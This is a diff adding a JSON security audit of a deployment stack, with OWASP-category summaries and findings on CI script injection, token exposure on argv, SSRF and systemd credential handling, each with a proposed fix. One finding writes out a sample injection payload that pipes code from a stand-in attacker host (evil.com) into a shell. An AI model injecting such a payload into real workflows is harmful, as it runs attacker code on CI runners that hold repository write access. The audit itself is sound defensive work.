@@ -1,0 +1,201 @@
+{
+  "audit": "security",
+  "task": "21",
+  "scope": "T01-T19 integrated",
+  "overall_verdict": "needs-remediation",
+  "owasp_summary": {
+    "A01": "Mostly OK. workspace-manager enforces strict task_id/repo/topic/base_ref regexes at the pydantic layer plus a defense-in-depth re-check on path params, blocking path-traversal and argument injection. /turn-into-task enforces an allow-list of Telegram operator user_ids (rejects when WATCHDOG_OPERATOR_USER_IDS empty). Branch-protection script (T19) enforces smoke-gate + 1 review + enforce_admins. Agent trust boundary is documented (sanitized-logging, no main push) but the only programmatic gate is the molyanov pk-guard hook scoped to RUFLO_SESSION — see Finding F-005.",
+    "A02": "OK. Mnemonic signing key is loaded via systemd LoadCredential at /run/credentials/... and never seen by Ansible variables (vault:// is a reference, not material) — but see Finding F-001 about the systemd LoadCredential path semantics. last-known-good.sh attempts a signed tag (git tag -s) and falls back to annotated; safe-mode-rollback.yml verifies the tag signature with `git verify-tag` before checkout. sops + age handle Ansible inventory secrets with placeholders requiring operator setup. No hardcoded secrets observed in source.",
+    "A03": "Mostly OK. workspace-manager uses argv-form subprocess.run with -- separator before user-supplied refs, blocking git option injection. molyanov validators reject extra_args starting with `-` and insert `--` sentinel. Pydantic regexes block path traversal (.., /, \\). BUT: pr-conformance composite action interpolates ${{ inputs.pr_body }} directly into shell heredoc (script injection) — see Finding F-002 (critical). e2e-smoke.yml interpolates user-supplied feature_name into ssh commands and curl payloads — Finding F-003 (high). Telegram messages in pk-guard.sh use parse_mode=HTML with unsanitized RUFLO_SESSION — Finding F-006.",
+    "A04": "Mostly OK. Agents are sandboxed by systemd hardening (NoNewPrivileges, ProtectSystem=strict, CapabilityBoundingSet=) and the ufw default-deny inbound rule. Sanitizer is enforced as a module-import hard-fail at startup of workspace-manager, watchdog, swarm_bridge, ruflo_client. Tofu rejects 0.0.0.0/0 inbound except UDP/41641 (Tailscale). Defense-in-depth missing in two spots: smoke-gate mock workspace-manager binds 0.0.0.0:8080 inside container (Finding F-008), and Telegram bot token reaches process argv via curl URL in several scripts (Finding F-004).",
+    "A05": "Mostly OK. Caddy admin endpoint bound to 127.0.0.1:2019 (metrics only). Vaultwarden caddy binds tailscale_ip:8443 only. mnemonic-mcp binds 127.0.0.1:7777. workspace-manager BIND_IP rejects 0.0.0.0/:: at the pydantic field validator. Hetzner firewall denies all inbound except UDP/41641. Default placeholder values (mnemonic_mcp_binary_sha256 = 'REPLACE_WITH_REAL_SHA256_BEFORE_DEPLOY', telegram_ai_agent_pin = 'v0.0.0-mnemonic.1', age recipient placeholder) all fail-fast at deploy time via explicit assertions — good. systemd hardening is comprehensive across workspace-manager, watchdog, mnemonic-mcp, restic.",
+    "A06": "Mostly OK. Tailscale APT key, Docker GPG key, restic GitHub release binary all SHA-pinned. mnemonic-mcp binary requires real SHA256 (placeholder fails assertion). uv installer is curl-piped to sh without sha256 (Finding F-009) — mitigated by version pin. ruflo installer is SHA256-checksummed before bash. OpenTofu provider pinned to ~>1.45 with lockfile requirement documented. No vendored node_modules audited but they exist under harness fixtures (test scope, not runtime).",
+    "A07": "OK. Tailscale auth-key is written to /run/tailscale-authkey.txt mode 0600 owner root, used via --auth-key=file:, then deleted in `always:` block, with no_log:true throughout. SSH password-auth disabled (PermitRootLogin no, PasswordAuthentication no). Vaultwarden admin_token required >=32 chars asserted, with operator-interactive first-user registration. /turn-into-task requires explicit operator user_id allowlist — empty allowlist rejects everyone (fail-closed). Bot tokens stored via sops + LoadCredential on watchdog but EnvironmentFile on telegram-ai-agent (less ideal — Finding F-007).",
+    "A08": "Mostly OK. last-known-good signed-tag attempt is best-effort with annotated fallback (acceptable — verify-tag in rollback playbook is hard gate). safe-mode-rollback verifies signature with git verify-tag before checkout. Restic backup-verify script checks marker SHA256 + 5% crypto integrity check. PR template enforces sections + 500-line cap. Smoke-gate mock workspace-manager is mock-only (no real fabric init validation in container) — Finding F-010 (medium). branch-protection script enforces 1 review + dismiss_stale + code-owners + enforce_admins.",
+    "A09": "Mostly OK. Sanitizer is ubiquitous across producers (workspace-manager logging_setup, watchdog __main__, scheduler, swarm_bridge, ruflo_client, workspace_client, molyanov _common — all hard-fail import). Patterns cover base58, JWK, sk-/api_/ANTHROPIC_, Telegram file URLs. Caveat: pattern is per-line; multi-line pretty JSON requires caller compaction (documented). pk-guard.sh and ops-notify.sh emit Telegram messages WITHOUT the python sanitizer wrapper — relies on logger -t for journal-side filtering only — Finding F-011 (medium). Failed-attestation check is a critical-class watchdog check that requires explicit acknowledge_disable_consequences in config — good.",
+    "A10": "Mostly OK. watchdog url_validator enforces http(s) only + private-range allow + named-host allow-list (api.devnet.solana.com, devnet.irys.xyz, api.telegram.org), used by solana_rpc/irys_balance/failed_attestation. devnet/Arweave full-mode harnesses enforce an allow-list of hosts before submitting (rejects mainnet). post_deploy_qa_wrapper._reject_ssrf_url blocks loopback + RFC1918 + link-local — BUT it allows arbitrary hostnames without DNS resolution (documented gap — Finding F-012 informational/low). irys_balance check builds account URL by string concatenation without URL-encoding the address (Finding F-013 low — input is regex-bounded upstream)."
+  },
+  "deep_dive_verdicts": {
+    "vaultwarden_interaction": "PASS with one concern. workspace-manager loads bw session token via systemd LoadCredential from /run/credentials/workspace-manager.service/bw-session. vault.py reads the file, passes the token as --session argv to `bw get item` — visible in /proc/<pid>/cmdline during the call window (Finding F-014 medium: prefer BW_SESSION env or stdin). bw stdout (decrypted secret) is parsed and never logged (only key_count metadata). bw stderr is suppressed from logs to avoid token fragment leakage. .env materialisation uses tempfile + fchmod 0600 + atomic rename + dir fsync — robust. The token is never echoed to stdout, never logged, never placed in an env var on the workspace-manager process tree.",
+    "env_materialisation": "PASS. vault.py: tempfile.mkstemp + os.fchmod(fd, 0o600) + os.fdopen + os.replace + dir fsync. Mode 0600 enforced PRE-rename so the final file is atomically 0600 (no 0644 race window). Owner is process user (op on the production host per systemd unit). DELETE /worktree path calls remove_env(Path) which unlink()s the .env. Roll-back paths in main.py call remove_env on worktree-create failures. .env is never read by anything other than the worktree's own shell — agents inherit it implicitly via the worktree being their cwd.",
+    "sanitizer_ubiquity": "PASS with one gap. Every Python producer enforces SanitizedFileHandler/SanitizedStreamHandler import as a hard startup failure (WORKSPACE_MANAGER_REQUIRE_SANITIZER / WATCHDOG_REQUIRE_SANITIZER default true). workspace-manager logging_setup.py refuses to start without it. watchdog __main__.py refuses to start without it. swarm_bridge, ruflo_client, workspace_client, kaneo, telegram, molyanov _common all import-fail without it. Gap: shell scripts (pk-guard.sh, ops-notify.sh, fabric-backup.sh, safe-mode-rollback.yml curl steps) do not pass messages through the Python sanitizer — they rely on jq-based JSON-escaping and journal-side logger filtering. Acceptable for static templates but pk-guard.sh embeds RUFLO_SESSION directly into a parse_mode=HTML message (Finding F-006).",
+    "agent_trust_boundary": "PARTIAL. Strong controls: (a) workspace-manager strict regex + path containment + git -- separator block traversal/argument injection; (b) bw session never reaches agents — they read .env from their cwd, materialised by op; (c) Tailscale ACL governs who can SSH, hetzner firewall denies public inbound; (d) branch protection enforces smoke-gate + 1 review on mnemonic-loop; (e) systemd hardening (NoNewPrivileges, CapabilityBoundingSet=, ProtectSystem=strict, ReadWritePaths constrained). Gaps: pk-guard.sh only fires when RUFLO_SESSION is set — agents that DON'T set RUFLO_SESSION bypass the PK references write guard (Finding F-005 high). Agents have sudo NOPASSWD (Finding F-015 informational/low — accepted-risk per spec). No programmatic prevention of `git push origin main` from a worktree — relies on branch-protection alone (acceptable defense-in-depth)."
+  },
+  "service_binding_scan": "PASS. Hetzner cloud firewall denies all public inbound except UDP/41641 (Tailscale handshake). On-host: ufw default deny incoming + allow tailscale0 interface, enabled only after tailscale is up. workspace-manager BIND_IP rejects 0.0.0.0/::. Vaultwarden caddy binds {tailscale_ip}:8443. mnemonic-mcp binds 127.0.0.1:7777. Caddy admin (metrics) binds 127.0.0.1:2019. Kaneo bound via docker `expose: 3030` (container-internal only) with Caddy reverse-proxy on tailnet. Watchdog has no listener (oneshot). SSH disabled for public — only via Tailscale SSH. One container-internal exception: smoke-gate entrypoint.sh binds python http.server to 0.0.0.0:8080 but docker-compose maps to 127.0.0.1:8080 on the runner — limited blast radius (ephemeral CI container) but worth tightening (Finding F-008).",
+  "findings": [
+    {
+      "id": "F-001",
+      "severity": "high",
+      "area": "A02 / systemd / mnemonic-mcp",
+      "file": "infrastructure/ansible/roles/mnemonic-mcp/templates/mnemonic-mcp.service.j2",
+      "line": 15,
+      "exploit_scenario": "systemd LoadCredential expects a file path (or @id:path / @encrypted: pattern). The value `vault://mnemonic/mcp-signing-key` is a custom URI scheme that systemd will treat as a literal file path and FAIL to open, causing the unit to refuse to start — OR, depending on systemd version, silently produce an empty credential and let the binary start with NO signing key, allowing the entire attestation chain to be subverted (degraded-mode signing or operator confusion).",
+      "fix": "Replace `LoadCredential=mnemonic-signing-key:vault://mnemonic/mcp-signing-key` with a real on-disk path that an Ansible task materialises from sops/Vaultwarden at deploy time (mode 0600 owner root, in /etc/credstore or /run/credentials/mnemonic-mcp.service/). Pattern after workspace-manager.service: `LoadCredential=mnemonic-signing-key:/etc/fabric/credentials/mnemonic-signing-key`. Or use systemd's LoadCredentialEncrypted+ImportCredential pair with the key encrypted via systemd-creds."
+    },
+    {
+      "id": "F-002",
+      "severity": "critical",
+      "area": "A03 / CI / pr-conformance",
+      "file": "work/coding-fabric/fabric/github-templates/composite-action/action.yml",
+      "line": 43,
+      "exploit_scenario": "`pr_body=\"${{ inputs.pr_body }}\"` is a classic GitHub Actions script-injection vector. An external contributor opens a PR with a body containing `\";$(curl evil.com|sh)\";`; GitHub Actions templates the PR body BEFORE the shell parses it, so the quote breaks and arbitrary code runs on the runner. The runner has GITHUB_TOKEN (write to commits/PRs/statuses) and could be used to merge or modify the repo. Same pattern in lines 107 (`pr_body=\"${{ inputs.pr_body }}\"` in extract_task_type). This template is intended for use by downstream repos so the blast radius is every repo that adopts it.",
+      "fix": "Pass PR body via environment variable, not template expansion: `env: PR_BODY: ${{ inputs.pr_body }}` then read `$PR_BODY` in the shell. The env-var path is shell-safe because Actions writes it to the runner env and the shell sees only the literal value. Apply to both the validate step (line 43) and extract_task_type step (line 107)."
+    },
+    {
+      "id": "F-003",
+      "severity": "high",
+      "area": "A03 / CI / e2e-smoke",
+      "file": ".github/workflows/e2e-smoke.yml",
+      "line": 99,
+      "exploit_scenario": "`bash /tmp/smoke.sh '${{ inputs.feature_name }}'` lets `feature_name` (workflow_dispatch input — operator-supplied, but also accessible via workflow_call from another repo) close the single quote and inject shell commands. Same pattern on lines 120 (`--feature='${{ inputs.feature_name }}'` in mnemonic_recall), 170 (jq filter embedded), 218 (mnemonic_sign_memory), 269 (curl text). On the runner the shell has secrets.TAILSCALE_OAUTH_SECRET and SSH access to the production VM.",
+      "fix": "Use env-var pattern: `env: FEATURE_NAME: ${{ inputs.feature_name }}` and reference `\"$FEATURE_NAME\"` in shell. Validate feature_name against a strict regex (e.g. `^[a-z0-9-]{3,40}$`) in a preceding step that fails fast on bad input. The mnemonic_recall/sign_memory calls additionally cross an SSH boundary — single-quoting on local does not protect the remote shell; use `printf %q` or pass via stdin instead."
+    },
+    {
+      "id": "F-004",
+      "severity": "high",
+      "area": "A02 / proc-list / Telegram tokens",
+      "file": "infrastructure/ansible/roles/molyanov/files/pk-guard.sh:25, infrastructure/ansible/roles/molyanov/files/ops-notify.sh:29, infrastructure/ansible/playbooks/safe-mode-rollback.yml:137,181,230, infrastructure/ansible/roles/restic-backups/templates/fabric-backup.sh.j2:65, scripts/e2e/smoke.sh:70, .github/workflows/e2e-smoke.yml:272",
+      "line": 25,
+      "exploit_scenario": "Every script that calls `curl https://api.telegram.org/bot${TOKEN}/sendMessage` puts the bot token on the process argv. Any process running as the same user (or root) can read /proc/<pid>/cmdline and recover the token. On the loop VM all of pk-guard, ops-notify, restic-backup run as the same `op` (or root) so the immediate cross-user blast radius is limited — but in CI the runner is shared with checkout/install steps, and on the VM a compromised agent worktree (also `op`) can scrape /proc.",
+      "fix": "Use Telegram's API in a token-not-in-URL form: place the token in the request body via a wrapper using `curl --config -` or via `python -c` reading TELEGRAM_BOT_TOKEN from env. Pattern matches the python TelegramPoster in fabric/watchdog/telegram.py which scrubs the token from exception reprs. Alternative: replace shell curl calls with a small `tg-send` binary that reads token from a file at /run/credentials/...service/telegram-bot-token (systemd LoadCredential)."
+    },
+    {
+      "id": "F-005",
+      "severity": "high",
+      "area": "A01 / agent trust boundary",
+      "file": "infrastructure/ansible/roles/molyanov/files/pk-guard.sh",
+      "line": 12,
+      "exploit_scenario": "`if [[ -z \"${RUFLO_SESSION:-}\" ]]; then exit 0; fi` means an agent that does NOT set RUFLO_SESSION can write freely to .claude/skills/project-knowledge/references/. An agent spawned via molyanov directly (not through ruflo's swarm wrapper), or any code path that drops RUFLO_SESSION before invoking the hook, bypasses the guard. The PK references directory is intended canonical knowledge with operator-only write privilege.",
+      "fix": "Invert the gate: fire the guard for EVERY write to the PK references directory, only EXEMPT a small allow-list of trusted invokers (e.g. `MOLYANOV_OPERATOR=1` set in the operator's interactive shell, or a UID check against an operator UID). Defense-in-depth: also enforce filesystem ACLs (setfacl) so non-operator UIDs cannot write the directory at all, regardless of hook coverage."
+    },
+    {
+      "id": "F-006",
+      "severity": "medium",
+      "area": "A03 / Telegram HTML injection",
+      "file": "infrastructure/ansible/roles/molyanov/files/pk-guard.sh",
+      "line": 24,
+      "exploit_scenario": "ALERT message embeds $RUFLO_SESSION and $TARGET_PATH unescaped into a `parse_mode=HTML` Telegram message. Telegram's HTML parser supports a subset (<b>,<i>,<a href=>) but a malicious worktree name or path containing `<a href=\"javascript:...\">` will render as a clickable link in the ops channel; could trick an operator into approving a malicious action. Lower-impact than RCE but real social-engineering surface.",
+      "fix": "Either escape `&`, `<`, `>`, `\"` from $RUFLO_SESSION and $TARGET_PATH before embedding, or drop parse_mode entirely (plain text is the safe default — same pattern as fabric/watchdog/telegram.py which deliberately omits parse_mode for this exact reason)."
+    },
+    {
+      "id": "F-007",
+      "severity": "medium",
+      "area": "A02 / EnvironmentFile secret exposure",
+      "file": "infrastructure/ansible/roles/telegram-ai-agent/templates/telegram-ai-agent.service.j2",
+      "line": 15,
+      "exploit_scenario": "`EnvironmentFile=/etc/telegram-ai-agent/.env` loads TELEGRAM_BOT_TOKEN and ANTHROPIC_API_KEY into the service's process environment. Any `cat /proc/<pid>/environ` from a process running as `op` (e.g. a compromised worktree agent) recovers all four secrets in one read. The file itself is mode 0600 owner op so cross-user is limited, but cross-process within `op` is unconstrained.",
+      "fix": "Switch to systemd LoadCredential (pattern matches workspace-manager.service and fabric-watchdog.service). The bot reads its token from /run/credentials/telegram-ai-agent.service/telegram-bot-token at startup (one-time) rather than carrying it in environ for the lifetime of the process. Same for ANTHROPIC_API_KEY and DEEPGRAM_API_KEY."
+    },
+    {
+      "id": "F-008",
+      "severity": "medium",
+      "area": "A05 / smoke-gate binding",
+      "file": "work/coding-fabric/fabric/safe-mode/smoke-gate/entrypoint.sh",
+      "line": 85,
+      "exploit_scenario": "`socketserver.TCPServer((\"0.0.0.0\", 8080), TaskHandler)` binds to all interfaces inside the smoke-gate container. docker-compose port-maps to 127.0.0.1:8080 on the runner so external internet exposure is blocked — BUT inside the container's `fabric-net` bridge the mock workspace-manager is reachable from any sidecar (mnemonic-mcp, fabric-watchdog) without authentication, and these containers are running candidate code from PRs which may not be trusted.",
+      "fix": "Change bind to `(\"127.0.0.1\", 8080)` inside the container and use docker-compose `network_mode: host` only if cross-container access is genuinely needed. Or front the mock with a token check (`?token=...` query param compared against an env var) so a malicious sidecar cannot enumerate task state."
+    },
+    {
+      "id": "F-009",
+      "severity": "medium",
+      "area": "A08 / supply chain / uv installer",
+      "file": "infrastructure/ansible/roles/telegram-ai-agent/tasks/main.yml",
+      "line": 49,
+      "exploit_scenario": "`curl -LsSf https://astral.sh/uv/install.sh | sh -s {{ telegram_ai_agent_uv_version }}` pipes a remote installer to a shell without sha256 verification. A compromise of astral.sh or a TLS-MITM on the runner injects arbitrary code as root (the task is becoming via Ansible become). The pinned version arg `0.5.3` reduces but does not eliminate risk — the install.sh script itself is fetched fresh every run.",
+      "fix": "Mirror the install.sh into Hetzner Storage Box or a versioned URL (`https://github.com/astral-sh/uv/releases/download/0.5.3/uv-installer.sh`) and use `ansible.builtin.get_url` with a `checksum:` line, then `command: bash uv-installer.sh`. Match the pattern already used for restic and mnemonic-mcp binaries in the same playbook."
+    },
+    {
+      "id": "F-010",
+      "severity": "medium",
+      "area": "A08 / smoke-gate is a mock",
+      "file": "work/coding-fabric/fabric/safe-mode/smoke-gate/entrypoint.sh",
+      "line": 22,
+      "exploit_scenario": "The smoke-gate container claims (tech-spec §10) to validate candidate fabric end-to-end before any mnemonic-loop self-merge. The implementation is a python http.server that just returns task_id from POST and flips task['status']='completed' after 5 seconds — it does not actually exercise workspace-manager, mnemonic-mcp, or ruflo. A malicious mnemonic-loop PR can pass smoke-gate trivially even if the candidate is broken or backdoored.",
+      "fix": "Replace mock with real candidate image: build the workspace-manager / watchdog / mcp Python packages from the PR's source tree, run them under their real systemd-unit equivalents (without LoadCredential — use stub credentials in /tmp), and exercise POST /worktree -> agent_spawn stub -> DELETE /worktree against the actual code paths. The current stub is acceptable as scaffolding but MUST NOT be merged into production without a real harness."
+    },
+    {
+      "id": "F-011",
+      "severity": "medium",
+      "area": "A09 / shell paths bypass sanitizer",
+      "file": "infrastructure/ansible/roles/molyanov/files/pk-guard.sh, infrastructure/ansible/roles/molyanov/files/ops-notify.sh, infrastructure/ansible/roles/restic-backups/templates/fabric-backup.sh.j2",
+      "line": 25,
+      "exploit_scenario": "Shell scripts post Telegram messages and journal entries directly without calling fabric.logs.sanitizer.filter.sanitize(). pk-guard's $TARGET_PATH could carry a base58 keypair as part of a malicious filename ($RUFLO_SESSION/keypair.json...). The pattern would land in the ops channel unsanitized. The python paths use the central sanitizer; the shell paths rely on ad-hoc sed (e2e-smoke.yml's sanitizer is sed-based and incomplete — doesn't match the python pattern library).",
+      "fix": "(a) Centralize shell-side redaction by piping any user-derived field through a small CLI wrapper around fabric.logs.sanitizer.filter.sanitize — `python3 -c 'from fabric.logs.sanitizer.filter import sanitize; import sys; sys.stdout.write(sanitize(sys.stdin.read()))'` — before embedding in shell-built messages. (b) Replace e2e-smoke.yml's hand-rolled sed (line 260-265) with the same CLI. (c) Update sanitizer pattern docs to call out shell-side caveats."
+    },
+    {
+      "id": "F-012",
+      "severity": "low",
+      "area": "A10 / DNS-based SSRF in post-deploy-qa",
+      "file": "fabric/molyanov/validators/post_deploy_qa_wrapper.py",
+      "line": 78,
+      "exploit_scenario": "_reject_ssrf_url only blocks bare IPs and the literal name 'localhost'. A hostname that DNS-resolves to a private/loopback address (e.g. an attacker-controlled DNS record `evil.example.com -> 127.0.0.1`) passes the check and the browser plugin gets steered at the loopback. The docstring already documents the gap: 'operators must ensure DNS does not resolve to private ranges'. Real-world impact bounded because the validator is operator-invoked and the browser plugin itself may enforce its own allowlist.",
+      "fix": "Either (a) resolve the hostname via socket.gethostbyname / getaddrinfo and re-run _BLOCKED_PREFIXES check on the resolved IP, accepting the DNS round-trip cost; or (b) require an explicit allowlist of post-deploy targets (operator-managed) and reject everything else. Option (b) is recommended because tailnet DNS already provides a closed set of legitimate targets."
+    },
+    {
+      "id": "F-013",
+      "severity": "low",
+      "area": "A03 / URL-injection in irys check",
+      "file": "fabric/watchdog/checks/irys_balance.py",
+      "line": 59,
+      "exploit_scenario": "`url = f\"{node_url}/account/balance/{address}\"` does not URL-encode `address`. If `irys_address` config carries a `?` or `#` character, the parser interprets it as a query string or fragment, possibly hitting an unexpected endpoint. The kaneo.py `_existing_card` has the same shape: `f\"/api/tasks?project={...}&q=alert_id%3A{alert_id}\"` (alert_id is bounded by the watchdog regex, but is not URL-encoded). Low impact because the input is operator-supplied config, not external attacker input.",
+      "fix": "Use urllib.parse.quote(address, safe='') for path components and quote_plus for query string values. Patch both irys_balance.py and watchdog/kaneo.py:_existing_card."
+    },
+    {
+      "id": "F-014",
+      "severity": "medium",
+      "area": "A02 / bw session token on argv",
+      "file": "fabric/workspace-manager/vault.py",
+      "line": 56,
+      "exploit_scenario": "`subprocess.run([\"bw\", \"get\", \"item\", item_name, \"--session\", session_token], ...)` places the bitwarden session token on the argv of the bw subprocess. /proc/<bw_pid>/cmdline reveals the token to any process running as `op` (or root). The window is short (a single bw invocation) but a co-resident worktree agent racing /proc reads can capture it. Once captured, the attacker has decrypt access to the entire shared Vaultwarden vault until the session expires.",
+      "fix": "Pass the session token via the BW_SESSION environment variable on the subprocess (subprocess.run([...], env={**os.environ, 'BW_SESSION': session_token})). The bw CLI honours BW_SESSION as an alternative to --session. Environment is not visible in /proc/<pid>/cmdline; it requires /proc/<pid>/environ which is only readable by the process owner — better isolation. Update check_reachable() (`bw status --session ...`) the same way."
+    },
+    {
+      "id": "F-015",
+      "severity": "info",
+      "area": "A01 / accepted-risk: op NOPASSWD sudo",
+      "file": "infrastructure/ansible/roles/base/tasks/main.yml",
+      "line": 55,
+      "exploit_scenario": "Operator user `op` has NOPASSWD: ALL sudo, and is the owner of agent worktrees, the workspace-manager process, and the Vaultwarden client. A compromised agent that escapes its worktree-cwd has trivial root via `sudo -n bash`. Per tech-spec §9, `op` is the trust boundary for the whole loop and this is documented as accepted-risk for v0.1.",
+      "fix": "(Accepted-risk per spec; informational only.) Future hardening path: split `op` into `op-agent` (worktree owner, no sudo) and `op-admin` (operator, sudo). The workspace-manager process runs as op-admin and writes worktree contents as op-agent via setuid wrapper. Outside scope for v0.1."
+    },
+    {
+      "id": "F-016",
+      "severity": "info",
+      "area": "A06 / vendored test fixtures",
+      "file": "fabric/harnesses/byte-equivalence/ts/node_modules/",
+      "line": null,
+      "exploit_scenario": "node_modules vendored under harness fixtures may contain transitive vulnerabilities (jest/babel chains). This is test-scope code, never executed in production, and only runs in CI under the harness. No exploitable surface at runtime.",
+      "fix": "(Informational.) Add a .gitattributes hint to exclude node_modules from grep/sanitizer scans; consider replacing the vendored install with a CI-time `npm ci` against pinned versions to make supply-chain drift visible."
+    },
+    {
+      "id": "F-017",
+      "severity": "medium",
+      "area": "A03 / safe-mode-rollback Telegram URL injection",
+      "file": "infrastructure/ansible/playbooks/safe-mode-rollback.yml",
+      "line": 137,
+      "exploit_scenario": "Three curl invocations in the playbook (lines 137-139, 181-183, 230-232) interpolate {{ telegram_bot_token }} directly into the URL via Jinja2. Although `no_log: yes` suppresses Ansible's recording, the token is still placed on the argv of curl AND substituted by Jinja into the shell cmd string BEFORE `set +x` runs — the rendered cmd is what gets passed to bash, so the token appears in /proc/<bash_pid>/cmdline. Same root cause as F-004 but with extra Ansible-templating layer making it harder to fix.",
+      "fix": "Replace the inline curl with a call to the same `tg-send` wrapper proposed in F-004, or use `ansible.builtin.uri:` module with `url_username`/`url_password` and `headers:` so Ansible does the HTTPS call without invoking shell. The uri module does not place secrets on argv."
+    }
+  ],
+  "positive_notes": [
+    "Sanitizer is enforced at import-time across every Python service — refusal-to-start is the strongest possible posture for log filtering. Pattern coverage (base58, JWK, sk-/api_/ANTHROPIC_, Telegram file URLs) matches AC38-AC41 directly.",
+    "workspace-manager defense-in-depth: pydantic regex at the model + path-param re-check at the route + path-containment check in worktree_path() + `--` separator before user-supplied refs. A pentester would need to bypass FOUR layers to inject a git option flag.",
+    "Capacity check + AlreadyExists check + flock all happen INSIDE the same flock window in state.add() — race-free. Most workspace-manager implementations TOCTOU here.",
+    "systemd hardening on workspace-manager, mnemonic-mcp, fabric-watchdog is comprehensive: NoNewPrivileges, CapabilityBoundingSet=, AmbientCapabilities=, MemoryDenyWriteExecute, SystemCallFilter=@system-service, ReadWritePaths constrained, RestrictAddressFamilies, PrivateTmp, ProtectKernelTunables/Modules/ControlGroups, LockPersonality. Combined with the Hetzner cloud firewall + ufw deny-incoming this is a credible posture.",
+    "Tailscale auth-key handled with file: form, mode 0600 owner root, written to /run (tmpfs), no_log: true on every task that touches it, deleted in `always:` block — textbook ephemeral-credential handling.",
+    "Failed-attestation watchdog check is gated as critical-class: scheduler refuses to disable it without explicit `acknowledge_disable_consequences=true` in config. Prevents silent regression of AC11-AC16.",
+    "Alert state TOCTOU fix: is_seen() acquires the same flock as mark_seen(). Most TTL caches race here.",
+    "/turn-into-task fail-closed semantics: empty WATCHDOG_OPERATOR_USER_IDS rejects ALL requests (vs. the easier-but-wrong default of allowing all). Friendly rejection message does not leak whether the alert_id exists.",
+    "url_validator gracefully accepts CGNAT (100.64.0.0/10) for tailnet IPs without trusting public ranges. Matches the deployment topology.",
+    "PR template enforces conformance + 500-line cap + signed last-known-good tag verification before checkout — all the rails the methodology specifies.",
+    "Restic backup script aborts the prune step if dry-run would delete >50 snapshots — explicit guard against accidental data loss. Repository password loaded via systemd EnvironmentFile from a 0600/root file (not embedded in the script).",
+    "Hetzner firewall + cloud-init + lifecycle ignore_changes=user_data is a clean cold-start model: rotating SSH keys happens via Ansible (not by destroying the server), and label drift is tolerated."
+  ],
+  "remediation_priority": [
+    "F-002 (critical) — fix pr-conformance composite action script-injection: pass pr_body via env, not template expansion. Highest blast radius (template adopted by every fabric repo). Single-line fix.",
+    "F-001 (high) — fix mnemonic-mcp LoadCredential path: replace vault:// URI with a real on-disk path materialised by a sops-decrypting Ansible task. Without this, the entire attestation chain can silently degrade.",
+    "F-003 (high) — fix e2e-smoke.yml feature_name injection: env-var pattern + regex validate step. Touches one workflow; same pattern as F-002.",
+    "F-005 (high) — invert pk-guard semantics: enforce by default, allow-list operator UID; back with setfacl on the PK references directory.",
+    "F-004 / F-017 (high+medium) — eliminate bot token from curl argv across pk-guard, ops-notify, fabric-backup, safe-mode-rollback, smoke.sh, e2e-smoke.yml. Single `tg-send` wrapper resolves all of them."
+  ]
+}
